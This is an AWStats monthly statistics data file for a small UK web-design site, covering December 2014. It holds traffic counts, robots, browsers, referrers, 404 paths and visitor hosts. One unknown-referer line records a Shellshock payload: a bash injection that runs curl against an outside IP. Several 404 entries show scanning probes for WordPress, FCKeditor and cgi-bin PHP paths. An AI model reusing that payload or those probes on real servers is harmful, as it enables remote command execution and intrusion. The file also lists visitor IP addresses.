@@ -1,0 +1,940 @@
+AWSTATS DATA FILE 7.0 (build 1.971)
+# If you remove this file, all statistics for date 201412 will be lost/reset.
+# Last config file used to build this data file was /etc/awstats/awstats.www.smartsites4u.co.uk.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 27
+POS_GENERAL 2002                
+POS_TIME 2674                
+POS_VISITOR 13767               
+POS_DAY 32707               
+POS_DOMAIN 3613                
+POS_LOGIN 4257                
+POS_ROBOT 4412                
+POS_WORMS 5550                
+POS_EMAILSENDER 5681                
+POS_EMAILRECEIVER 5824                
+POS_SESSION 33596               
+POS_SIDER 33804               
+POS_FILETYPES 5959                
+POS_DOWNLOADS 6190                
+POS_OS 6289                
+POS_BROWSER 6485                
+POS_SCREENSIZE 7970                
+POS_UNKNOWNREFERER 8044                
+POS_UNKNOWNREFERERBROWSER 8710                
+POS_ORIGIN 9075                
+POS_SEREFERRALS 9222                
+POS_PAGEREFS 9391                
+POS_SEARCHWORDS 10026               
+POS_KEYWORDS 10288               
+POS_MISC 2338                
+POS_ERRORS 10463               
+POS_CLUSTER 4113                
+POS_SIDER_404 10626               
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20150101000015 1 0 10706102912821
+FirstTime 20141201013331
+LastTime 20141231231131
+LastUpdate 20150102000103 1 0 0 0 0
+TotalVisits 583                 
+TotalUnique 327                 
+MonthHostsKnown 242                 
+MonthHostsUnknown 108                 
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+QuickTimeSupport 0 0 0
+JavaEnabled 0 0 0
+JavascriptDisabled 0 0 0
+PDFSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+AddToFavourites 0 0 0
+RealPlayerSupport 0 0 0
+TotalMisc 0 0 0
+DirectorSupport 0 0 0
+FlashSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 17 258 4811797 713 779 3139614
+1 34 415 7376285 723 783 3218083
+2 39 477 8848174 655 775 2828920
+3 32 267 5613669 714 895 3412854
+4 25 443 8460248 681 747 2191272
+5 27 366 6958172 642 742 1891669
+6 36 451 8752830 787 890 3145783
+7 36 455 9170930 653 732 2024106
+8 87 370 6432935 825 972 5553206
+9 19 202 3993112 775 961 6472501
+10 23 527 10323249 667 1006 6566188
+11 67 435 9078055 743 1432 15641568
+12 53 409 7521310 680 1155 10748481
+13 66 267 4316899 746 917 5998602
+14 44 284 5676590 722 918 4981329
+15 20 236 4749452 636 688 1309508
+16 16 264 4869751 650 760 2699799
+17 35 144 3089042 637 747 2537601
+18 43 117 2450730 724 756 2716220
+19 25 213 4191536 617 661 1088719
+20 22 160 2759384 685 825 4077067
+21 49 307 5754656 666 773 3154941
+22 29 310 5628058 741 910 5055480
+23 51 428 8203775 718 803 3335423
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 27
+ip 338 1259 22854606
+com 193 3467 68650196
+cn 59 59 2248088
+br 53 1698 31164884
+it 52 184 2786873
+nl 44 44 1397626
+eu 42 56 1154856
+de 37 70 1407516
+net 28 398 7051022
+pl 17 52 1114490
+uk 2 2 8831
+pt 2 69 1322627
+tr 1 34 620631
+jp 1 34 620632
+es 7 40 694126
+ru 3 3 85328
+my 1 34 620631
+lv 1 34 620630
+mx 1 34 620633
+ma 1 34 620633
+in 5 98 1410505
+at 1 34 620635
+us 1 1 22220
+info 1 1 8822
+za 2 2 77178
+ar 1 30 605785
+lt 1 34 620635
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 27
+robot 9041 3859690 20141231235515 8
+no_user_agent 4407 1117837 20141231235104 1
+bot[\s_+:,\.\;\/\\-] 2657 49656630 20141231191222 71
+googlebot 1090 6478809 20141231203206 58
+baiduspider 800 12100201 20141231213220 6
+vagabondo 347 12742493 20141231213838 17
+yandex 188 2092784 20141231143048 37
+phantom 179 2326164 20141230221734 0
+slurp 102 519877 20141231225914 23
+java\/[0-9] 93 2657814 20141228092432 0
+exabot 21 71497 20141229150408 12
+spider 2 17647 20141207161401 0
+seznambot 12 486136 20141224122945 2
+libwww 2 59604 20141230234252 0
+mail\.ru 10 51862 20141228224314 5
+unknown 45 34260 20141231172817 45
+facebook 19 605172 20141226034137 0
+python 47 323070 20141215195944 1
+surveybot 4 20747 20141226054032 2
+archive\.org_bot 53 835551 20141231034612 22
+favicon 2 15046 20141203203407 0
+tarantula 2 77186 20141224071155 0
+turnitinbot 47 282175 20141220161625 2
+mj12bot 76 1063992 20141231200313 19
+netcraft 4 154774 20141210233423 0
+crawl 61 1584009 20141231202924 6
+nutch 4 18927 20141212022001 2
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 8
+css 1422 3875850 0 0
+png 2334 82917414 0 0
+txt 2 179130 0 0
+html 487 10368807 0 0
+js 1537 25398946 0 0
+jpg 1545 19900905 0 0
+Unknown 408 5959941 0 0
+gif 70 429646 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 2
+/robots.txt 319 0 356130
+/CHANGELOG.txt 2 0 179130
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS 13
+linuxandroid 1074
+winlong 388
+winxp 1291
+win2000 2
+linuxubuntu 1
+winvista 51
+linux 91
+win7 4432
+macosx 288
+linuxgentoo 2
+winunknown 2
+win2003 9
+Unknown 174
+END_OS
+
+# Browser ID - Hits
+BEGIN_BROWSER 89
+msie6.0 71
+safari7.0.3 20
+firefox28.0 15
+chrome18.0.1025.308 68
+chrome34.0.1847.137 8
+firefox26.0 22
+chrome28.0.1500.94 170
+chrome39.0.2171.95 82
+curl 1
+firefox34.0 112
+firefox2.0.0.13 2
+firefox3.6.15 64
+chrome5.0.307.7 6
+chrome28.0.1500.72 1
+msie8.0 2155
+firefox2.0.0.14 1
+chrome11.0.696.34 1
+chrome39.0.2171.65 2
+msie7.0 138
+konqueror3.0 2
+chrome27.0.1453 24
+firefox0.10 1
+chrome29.0.1547.66 1
+chrome39.0.2171.71 3
+chrome34.0.1847.131 9
+lg\- 34
+firefox21.0 17
+safari6.0 10
+firefox29.0 5
+chrome14.0.803.0 1
+firefox7.0.1 1
+firefox12.0 7
+chrome32.0.1700.107 230
+chrome35.0.1916.114 6
+chrome36.0.1985.143 2842
+firefox3.5.5 1
+firefox33.0 1
+firefox25.0 4
+safari6.0.4 2
+mozilla 110
+chrome16.0.912.77 1
+firefox14.0.1 13
+firefox2.0 2
+safari5.1.9 3
+firefox3.0.10 1
+firefox15.0.1 1
+safari 17
+camino 1
+safari7.0 74
+firefox5.0 1
+firefox20.0 1
+chrome29.0.1547.57 1
+android 698
+firefox8.0 48
+chrome0.4.154.25 1
+firefox3.5.3 3
+chrome26.0.1410.58 1
+opera9.80 38
+links 1
+firefox31.0 3
+firefox3.6.19 31
+firefox13.0.1 1
+chrome12.0.706.0 1
+chrome19.0.1055.1 1
+chrome10.0.648.204 5
+safari8.0 135
+msie9.0 13
+Unknown 54
+chrome39.0.2171.93 1
+firefox32.0 1
+firefox17.0 1
+chrome18.0.1025.166 2
+samsung 102
+chrome20.0.1132.57 1
+firefox3.0.5 1
+firefox1.0 1
+chrome35.0.1916.153 234
+firefox3.0.6 1
+firefox22.0 18
+msie10.0 19
+safari5.1 3
+firefox6.0 1
+firefox3.5.9 6
+safari6.0.3 1
+firefox2.0.0.16 1
+chrome27.0.1453.116 7
+firefox3.5 1
+firefox3.6.8 1
+firefox3.6.13 2
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 9
+Mozilla/5.0_(compatible;_Lipperhey_SEO_Service;_http://www.lipperhey.com/) 20141211143011
+Mozilla/5.0_(compatible;_IODC-Internet_Engineering_Odysseus_015;__http://iodc.co.uk) 20141202082948
+Go_1.1_package_http 20141226034131
+BUbiNG_(_http://law.di.unimi.it/BUbiNG.html) 20141231081041
+http://www.nominet.org.uk/privacypolicy 20141205170819
+Mozilla/5.0_(Android;_Mobile;_rv:34.0)_Gecko/34.0_Firefox/34.0 20141203214105
+M 20141215174607
+ltx71_-_(http://ltx71.com/) 20141201213326
+()_{_:;};_/bin/bash_-c_'curl_http://176.102.38.36/search/e.php?h=smartsites4u.co.uk/' 20141217042805
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 6
+http://www.nominet.org.uk/privacypolicy 20141205170819
+M 20141215174607
+ltx71_-_(http://ltx71.com/) 20141201213326
+Sundance(Compatible;_Windows;_U;_en-US;)_Version/0.9.0.36 20141210023548
+Go_1.1_package_http 20141226034131
+BUbiNG_(_http://law.di.unimi.it/BUbiNG.html) 20141231081041
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 503 576
+From1 0 0
+From2 103 106
+From3 113 113
+From4 176 7010
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 2
+google 93 96
+baidu 10 10
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 10 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 13
+http://semalt.semalt.com/crawler.php 44 44
+http://buttons-for-website.com 36 36
+http://make-money-online.7makemoneyonline.com/money.php 20 20
+http://www.theplaystationtotnes.co.uk 3 3
+http://smartsites4u.com 2 2
+http://www.smartsites4u.com 1 1
+http://find1friend.com/search 1 1
+http://vidimo.net 1 1
+http://www.prospectingbasics.com 1 1
+http://217.70.184.38 1 1
+http://www.anahassel.com/pricing 1 1
+http://www.anahassel.com 1 1
+http://medispainstitute.com.au/treatments/skin-peels/ 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 1
+smartsites4u.co.uk%7cwebsitedesign+drupalsites+mobilefirst%7cprofessionalwebdesignservicesindevonandlondon 10
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 3
+mobilefirst%7cprofessionalwebdesignservicesindevonandlondon 10
+drupalsites 10
+smartsites4u.co.uk%7cwebsitedesign 10
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 7
+403 161 787772
+302 2 40
+206 23 232968
+500 4 7137
+400 1 226
+301 848 8740
+404 266 3498097
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referer
+BEGIN_SIDER_404 76
+/sitemap.xml 3 -
+/date 1 -
+/contact/website-brief 1 http://www.smartsites4u.co.uk/contact-us
+/vxwemqcjlwr.html 1 -
+/spuhxfbbgumdt.html 1 -
+/blog/license.txt 1 -
+/nojs 2 -
+/h 1 -
+/%3ca%20href%3d%22/portfolio/halflight-music%22%3eHalflight%20Music%3c/a%3e 1 -
+/packages/intermediate 23 -
+/sites/www.smartsites4u.co.uk/files/styles/adaptive_medium_600/adaptive-image/public/images/portfolio/Screen%20shot%202013-08-06%20at%201.18.59%20PM.png 1 -
+/sites/www.smartsites4u.co.uk/files/styles/adaptive_medium_600/adaptive-image/public/images/portfolio/Screen%20shot%202013-08-06%20at%2011.06.38%20AM.png 1 -
+/AHAH/Ajax 1 -
+/node/26 1 -
+/image/x-icon 1 -
+/content/pro 3 -
+/editor/filemanager/browser/default/connectors/asp/connector.asp 1 http://smartsites4u.co.uk/editor/filemanager/browser/default/connectors/asp/connector.asp
+/cgi-sys/entropysearch.cgi 1 -
+/button 1 -
+/template/default/common/footer.htm 1 -
+/apple-touch-icon-152x152.png 1 -
+/text/plain 1 -
+/djtnschwc.html 1 -
+/fckeditor/editor 1 -
+/%e8%81%bd2014-11-27%e8%81%bd 1 -
+/apple-touch-icon-152x152-precomposed.png 1 -
+/a 4 -
+/packages/pro 3 -
+/manage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp 1 http://smartsites4u.co.uk/manage/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
+/wp-login.php 124 -
+/and/or 1 -
+/text/html 1 -
+/cgi-bin/php.cgi 2 -
+/node/2816 1 -
+/wp-includes/css/admin-bar.css 1 -
+/path/nojs 2 -
+/node/51 1 -
+/text/javascript 1 -
+/apple-touch-icon.png 2 -
+/node/1428 1 -
+/cgi-bin/php 2 -
+/data/admin/ver.txt 1 http://www.smartsites4u.co.uk
+/packages 8 http://www.smartsites4u.co.uk/
+/cgi-bin/php5 2 -
+/node/2823 1 -
+/contact-us 4 -
+/cgi-bin/php4 2 -
+/n/a 1 -
+/w 1 -
+/trailing/leading 1 -
+/wp-admin/admin-ajax.php 2 -
+/license.txt 1 -
+/packages/starter 1 http://www.smartsites4u.co.uk/home
+/prev/next 1 -
+/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp 1 http://smartsites4u.co.uk/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
+/text/xml 1 -
+/sites/www.smartsites4u.co.uk/files/styles/adaptive_medium_600/adaptive-image/public/images/portfolio/Screen%20shot%202013-08-06%20at%201.14.16%20PM.png 1 -
+/week 1 -
+/cgi-bin/php-cgi 2 -
+//components/com_community/index.html 1 -
+/sites/all/modules/google_analytics/googleanalytics.js 5 -
+/sites/www.smartsites4u.co.uk/files/styles/adaptive_medium_600/adaptive-image/public/images/portfolio/Screen%20shot%202013-08-06%20at%201.54.01%20PM.png 1 -
+/administrator/index.php 1 -
+/CHANGELOG.txtindex.php 2 http://smartsites4u.co.uk/CHANGELOG.txtindex.php
+/webform-brief 8 -
+/IE/Chrome/Opera 1 -
+/node/2807 1 -
+/what-were-all-about 6 -
+/application/javascript 1 -
+/reset 1 -
+/danfuaemevsqx.html 1 -
+/multipart/form-data 1 -
+/application/x-www-form-urlencoded 1 -
+/node/2814 1 -
+/node/48 1 -
+/cgi-bin/main.cgi 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 350
+ptr.cnsat.com.cn 58 58 2240037 20141231115152
+43.252.230.221 48 48 302426 20141221132931
+s2.law.di.unimi.it 47 47 265651 20141231081041
+188.143.232.211 33 33 1053333 20141207200606
+host86-176-152-159.range86-176.btcentralplus.com 31 31 198096 20141202082948
+hosted-by.dahhosting.nl 27 27 828190 20141211143012
+62-210-167-213.rev.poneytelecom.eu 25 25 819454 20141227125225
+backup.starhost.nl 17 17 569436 20141210112436
+46.161.41.31 13 13 354400 20141228114042
+119.63.193.131 12 12 463425 20141226235215
+177.18.214.101.static.host.gvt.net.br 1 34 620632 20141210113547
+unassigned-87.236.194.234.coolhousing.net 1 1 38701 20141212223131
+google-proxy-66-102-6-217.google.com 1 15 237021 20141219145657
+ec2-54-174-17-106.compute-1.amazonaws.com 0 1 8986 
+223.25.16.103 1 27 530914 20141224155518
+199.101.132.234 1 1 8827 20141210023515
+host81-138-16-40.in-addr.btopenworld.com 1 1 38701 20141219055151
+189-107-113-134.user.veloxzone.com.br 1 34 620626 20141201061645
+23.95.94.34 1 1 6075 20141210015712
+google-proxy-66-249-83-139.google.com 1 27 477525 20141212015404
+93.170.186.71.ptr.serverdale.net 1 1 38701 20141222210524
+google-proxy-66-249-93-218.google.com 1 10 139721 20141205125747
+google-proxy-66-249-83-133.google.com 1 11 238249 20141211065316
+baiduspider-123-125-71-12.crawl.baidu.com 1 1 5410 20141206224319
+herndon-44.lastpass.com 2 4 89638 20141221082859
+212-83-142-137.rev.poneytelecom.eu 6 6 39685 20141227110834
+62-210-75-104.rev.poneytelecom.eu 1 8 94642 20141222053335
+abbm159.neoplus.adsl.tpnet.pl 1 1 38701 20141201142753
+clie42.225.73.177.bit-on.com.br 1 28 600101 20141213152035
+208.88.225.19 1 1 5377 20141210023549
+google-proxy-66-249-88-170.google.com 4 135 3471785 20141230014540
+23-94-222-3-host.colocrossing.com 1 1 8817 20141208035801
+61.135.190.223 1 1 8820 20141210011928
+ec2-54-172-157-246.compute-1.amazonaws.com 1 1 38686 20141205095349
+180.76.4.166 1 1 38593 20141230235808
+198.50.202.33 4 4 65165 20141231131641
+184-96-113-86.hlrn.qwest.net 1 34 620630 20141229143627
+199.101.134.206 1 1 5259 20141210023548
+google-proxy-66-102-6-20.google.com 3 64 1543069 20141207020823
+199.80.54.23 1 1 8826 20141210022143
+61.135.190.100 1 4 55359 20141202090019
+bd65db53.virtua.com.br 1 34 620631 20141201112839
+189-81-146-101.user.veloxzone.com.br 1 34 620633 20141216201333
+customer.krypt.com 8 8 50914 20141228095330
+199.101.134.198 3 3 19419 20141210023602
+14.236.153.27.broad.pt.fj.dynamic.163data.com.cn 1 1 8051 20141217093130
+61.135.190.220 1 1 8820 20141214183259
+61.135.190.219 0 4 39284 
+177-138-95-250.dsl.telesp.net.br 1 34 620631 20141201013331
+192.81.210.204 11 18 159673 20141204200006
+192.240.224.8 1 1 6613 20141224123914
+199.30.228.131 1 1 8827 20141223033354
+ip-191.240.233-130-cable.frionline.com.br 1 34 620631 20141210082109
+2582e25a.rdns.100tb.com 2 2 77294 20141231085014
+69.12.74.27.static.quadranet.com 1 1 6076 20141218020943
+google-proxy-66-249-83-216.google.com 0 5 112966 
+179-110-241-215.dsl.telesp.net.br 1 34 620634 20141218012420
+c-r022-u0049-203.webazilla.com 2 2 17643 20141220055343
+dfgw.itapenet.com.br 1 33 593365 20141226073441
+google-proxy-66-249-84-132.google.com 0 40 993815 
+31-178-116-73.dynamic.chello.pl 1 1 38593 20141227071511
+google-proxy-66-249-83-222.google.com 1 8 117933 20141214083602
+host86-190-159-184.range86-190.btcentralplus.com 2 38 637949 20141220022926
+google-proxy-66-249-83-145.google.com 0 12 490648 
+li754-111.members.linode.com 2 2 13559 20141216051655
+static.136.69.251.148.clients.your-server.de 6 6 141469 20141231223815
+200.17.172.11 1 34 620632 20141209233822
+static.8.155.76.144.clients.your-server.de 1 1 22584 20141227190050
+ec2-54-189-53-146.us-west-2.compute.amazonaws.com 1 1 8826 20141204045955
+google-proxy-66-249-83-132.google.com 4 178 4770199 20141221123558
+ns3001822.ip-37-59-4.eu 4 4 35284 20141206125948
+63.141.233.91 1 1 22387 20141214163150
+213.205.253.14 6 56 1272472 20141229072134
+173.234.178.176.rdns.ubiquityservers.com 1 1 6614 20141221194351
+198.50.161.248 1 1 7678 20141201195556
+187-4-9-86.cslce701.e.brasiltelecom.net.br 1 32 612217 20141216041855
+177.18.249.130.static.host.gvt.net.br 1 34 620631 20141217104957
+61.135.190.224 1 2 41569 20141231212255
+192.81.210.100 11 18 159774 20141216082425
+180.76.4.178 1 1 38593 20141231115233
+116.98.128.113 3 44 665248 20141211163024
+dynamic-adsl-84-221-135-110.clienti.tiscali.it 1 34 620634 20141217034355
+093105179090.dynamic-ww-2.vectranet.pl 1 1 8820 20141210124318
+200.75.176.27 1 32 587358 20141217112441
+static.11.65.251.148.clients.your-server.de 3 3 26468 20141203012701
+ec2-23-23-222-104.compute-1.amazonaws.com 1 1 8823 20141216060033
+ec2-54-81-250-101.compute-1.amazonaws.com 1 1 8825 20141223095847
+67.198.132.2.static.krypt.com 1 1 6613 20141221214721
+155.94.128.228.static.quadranet.com 1 1 5068 20141203144523
+google-proxy-66-249-83-223.google.com 5 185 2913838 20141226214938
+google-proxy-66-249-83-229.google.com 6 196 3784383 20141231020650
+201.203.127.143 1 34 620631 20141205083928
+cache.idc.js.chinamobile.com 2 2 46273 20141222200411
+findsa.co.za 2 2 77178 20141220202718
+162.243.170.66 11 18 159484 20141228193400
+62-210-124-165.rev.poneytelecom.eu 1 1 8827 20141218100835
+199.101.134.202 1 1 6497 20141210023531
+host-213-248-211-171.nominet.org.uk 2 2 8831 20141205170819
+ec2-54-173-117-40.compute-1.amazonaws.com 1 1 38701 20141206175603
+ds2563-02-n.solidseodedicated.com 2 2 16037 20141211080615
+google-proxy-66-249-83-247.google.com 0 29 364176 
+node-8ds.pool-101-108.dynamic.totbb.net 1 34 620630 20141212065835
+ip126.208-117-14.static.steadfastdns.net 1 1 8825 20141221175927
+baiduspider-123-125-71-33.crawl.baidu.com 1 1 8820 20141210031705
+5.62.16.234 1 1 8821 20141218174933
+14.18.243.89 0 1 3180 
+187-74-27-52.dsl.telesp.net.br 1 33 615691 20141219030652
+host81-138-12-141.in-addr.btopenworld.com 1 1 8821 20141217064558
+83.173.137.36.static.user.ono.com 1 1 8828 20141222132257
+031011237222.warszawa.vectranet.pl 2 2 77394 20141220214745
+google-proxy-66-102-6-135.google.com 0 7 201409 
+179.96.182.203 1 32 611129 20141216043235
+142.0.131.141 2 2 16103 20141209090847
+177-179-76-107.user.veloxzone.com.br 1 34 620632 20141208115536
+90.167.159.110.tm-hsbb.tm.net.my 1 34 620631 20141220023406
+104.156.240.174 1 1 8825 20141214003437
+wanderson.static.gvt.net.br 1 1 8829 20141228034154
+ec2-54-154-82-165.eu-west-1.compute.amazonaws.com 1 1 8816 20141226225728
+151.186-43-151.etapanet.net 1 34 620632 20141212175250
+abts-north-dynamic-216.100.64.182.airtelbroadband.in 3 31 171055 20141219014505
+ec2-54-81-79-148.compute-1.amazonaws.com 1 1 8828 20141222120533
+c9529578.virtua.com.br 1 33 617163 20141218104841
+92.f5.344a.static.theplanet.com 1 1 38701 20141220043457
+static.25.25.9.176.clients.your-server.de 2 2 77278 20141227212113
+google-proxy-66-249-84-229.google.com 4 139 3198432 20141228100204
+133.139.224.159.triolan.net 1 1 8821 20141219100136
+ns357201.ip-91-121-146.eu 1 1 8826 20141226034131
+119.63.193.132 10 10 386239 20141228034053
+adsl196-145-140-206-196.adsl196-5.iam.net.ma 1 34 620633 20141219071920
+23.95.94.252 1 1 6076 20141202181234
+46.188.211.140 1 34 620622 20141204053234
+google-proxy-64-233-172-230.google.com 7 83 1329268 20141229174924
+089144207048.atnat0016.highway.bob.at 1 34 620635 20141225041929
+google-proxy-64-233-172-191.google.com 2 82 1443716 20141220155759
+38.100.21.63 8 9 267618 20141222071935
+b18d2541.virtua.com.br 1 34 620635 20141203065735
+200-153-251-123.dsl.telesp.net.br 1 34 620637 20141221023947
+189-24-244-156.user.veloxzone.com.br 1 34 620631 20141220053916
+google-proxy-66-249-88-219.google.com 4 112 1697132 20141224195905
+187-41-179-159.user.veloxzone.com.br 1 34 620632 20141223050718
+186-38-23-4.mrse.com.ar 1 30 605785 20141205150426
+59.96.254.45 1 32 548936 20141219155647
+107.153.8.90.rdns.micfo.com 1 1 8815 20141210043313
+189-48-174-194.user.veloxzone.com.br 1 34 620631 20141225073155
+185.72.244.38 1 1 0 20141221042556
+199.101.132.162 1 1 5777 20141210023537
+fixed-188-137-138.iusacell.net 1 34 620629 20141230045746
+host86-157-239-111.range86-157.btcentralplus.com 1 1 8825 20141223022501
+google-proxy-66-249-83-234.google.com 0 13 735295 
+h048.helix.fastwebserver.de 1 1 42456 20141227154333
+ip-37-248-255-3.multi.internet.cyfrowypolsat.pl 1 34 620628 20141216011457
+192-211-54-171-customer-incero.com 1 1 6614 20141231063251
+78.182.131.74.dynamic.ttnet.com.tr 1 34 620631 20141220054038
+69.12.74.110.static.quadranet.com 1 1 6076 20141215120037
+198.52.254.141 1 1 6611 20141215182836
+180.76.4.216 1 1 38701 20141231034100
+61.135.190.103 0 10 92362 
+google-proxy-64-233-172-222.google.com 1 84 2199878 20141226223912
+104.128.31.241 1 1 8823 20141220211513
+201-8-66-165.user.veloxzone.com.br 1 34 620631 20141220124301
+google-proxy-66-249-84-246.google.com 1 41 1185131 20141213084014
+206.55.180.8 1 32 587964 20141210180406
+static.42.124.251.148.clients.your-server.de 3 3 67547 20141220220943
+117.201.120.28 1 30 605784 20141222064213
+baiduspider-123-125-71-44.crawl.baidu.com 1 1 5022 20141206224319
+61.135.190.105 2 5 64180 20141225170157
+200-171-28-234.dsl.telesp.net.br 1 34 620630 20141224134015
+baiduspider-123-125-71-104.crawl.baidu.com 1 1 6975 20141206224319
+baiduspider-123-125-71-57.crawl.baidu.com 1 1 5351 20141206224319
+208.94.234.21 1 1 5777 20141210023541
+80.40.134.103 0 3 70139 
+google-proxy-66-102-6-144.google.com 0 13 98091 
+85.255.232.111 0 1 164384 
+87-206-220-95.dynamic.chello.pl 0 2 179130 
+dynamic-185.106.142.202.sitibroadband.in 1 32 612599 20141216034540
+200.48.200.129 1 34 620627 20141230085405
+203.195.184.26 1 1 8821 20141206055033
+static.201.183.9.5.clients.your-server.de 1 1 38701 20141225080737
+176.102.38.36 1 1 0 20141217042805
+static.213-133-97-216.clients.your-server.de 4 4 38593 20141231231131
+200-215-116-177.bnut3702.dsl.brasiltelecom.net.br 1 28 600097 20141212042127
+92.222.98.237 4 4 26452 20141230233452
+google-proxy-66-249-83-240.google.com 1 11 113429 20141211073603
+187.122.150.74 1 34 620634 20141205014743
+201-92-150-129.dsl.telesp.net.br 1 34 620635 20141216131601
+rs.gov121.static.host.gvt.net.br 1 34 620633 20141218123339
+109.120.181.65 3 3 15530 20141206125948
+66.79.173.128 1 1 5422 20141228065036
+200-158-38-65.dsl.telesp.net.br 1 34 620628 20141230124409
+209.161.100.158 1 1 8820 20141221021633
+static.7.78.9.176.clients.your-server.de 1 34 620622 20141204072618
+baiduspider-220-181-108-89.crawl.baidu.com 1 1 7678 20141206224320
+199.101.134.201 1 1 8054 20141210023521
+189-68-247-89.dsl.telesp.net.br 1 34 620635 20141218071134
+bl22-119-171.dsl.telepac.pt 0 1 81371 
+78-60-115-155.static.zebra.lt 1 34 620635 20141219003930
+84.93.43.137 9 79 1292986 20141223123819
+dns111223.phdns5.es 1 1 8820 20141222143723
+211.138.121.38 1 1 8822 20141222023332
+119.63.193.195 10 10 386354 20141227034122
+197.29.20.95.dynamic.jazztel.es 1 34 620634 20141217233200
+23.247.173.186 1 1 8820 20141215062417
+static.85-10-199-67.clients.your-server.de 2 2 8822 20141207142925
+178.32.149.16 2 2 17639 20141209202759
+111.206.237.113 1 1 38701 20141201180130
+187-127-127-126.user.veloxzone.com.br 1 31 584496 20141217055115
+61.135.190.221 1 14 199414 20141206084954
+223.99.189.102 1 1 8821 20141219204331
+crawler-17.crawler.istella.it 1 1 38701 20141221211712
+baiduspider-220-181-108-118.crawl.baidu.com 1 1 5252 20141206224320
+105.108.137.247 1 15 107462 20141227103243
+pombonet-cecap-morada.pombonet.net.br 1 34 620631 20141202145945
+80.72.35.84 3 3 26461 20141224112425
+bl17-193-175.dsl.telepac.pt 1 34 620628 20141215231155
+198.252.44.7 5 5 192965 20141230144226
+host86-131-101-37.range86-131.btcentralplus.com 0 1 69183 
+186.116.8.170 1 1 8822 20141225185231
+google-proxy-66-249-83-217.google.com 3 189 3509306 20141227225320
+201-34-31-93.edpo-ro-a1k-01.dsl.brasiltelecom.net.br 1 32 612890 20141217092950
+69.13.39.34 1 1 38593 20141231114701
+199.19.249.196 1 1 35848 20141204043025
+177.45.251.249 1 34 620635 20141204101845
+119.147.146.189 0 1 3671 
+google-proxy-66-249-88-217.google.com 2 98 1403361 20141212074036
+83.1.be.static.xlhost.com 1 1 8815 20141215174607
+host-2-97-248-202.as13285.net 3 47 682386 20141203214104
+static-88.101.gw.v202.net 5 5 44114 20141231073101
+msnbot-65-55-210-107.search.msn.com 1 34 620627 20141227153643
+baiduspider-220-181-108-75.crawl.baidu.com 1 1 8815 20141210074532
+baiduspider-220-181-108-165.crawl.baidu.com 1 1 8825 20141207141414
+179.179.19.138.dynamic.adsl.gvt.net.br 1 34 620622 20141204043338
+192.241.154.95 11 18 159672 20141210060843
+119.63.193.194 7 7 270336 20141224175455
+static.88-198-227-103.clients.your-server.de 2 2 77294 20141227192417
+dyn-74-63.fttbee.kis.ru 1 1 38577 20141204072745
+155.133.19.145.ptr1-vnet.as49792.pl 9 9 69092 20141207030226
+199.80.54.22 2 2 16173 20141210023551
+208.94.234.20 1 1 8826 20141210022142
+191-255-79-250.dsl.telesp.net.br 1 32 589895 20141229055934
+177.101.216.94 1 36 629022 20141221060523
+bd1df7c6.virtua.com.br 1 32 612222 20141227103032
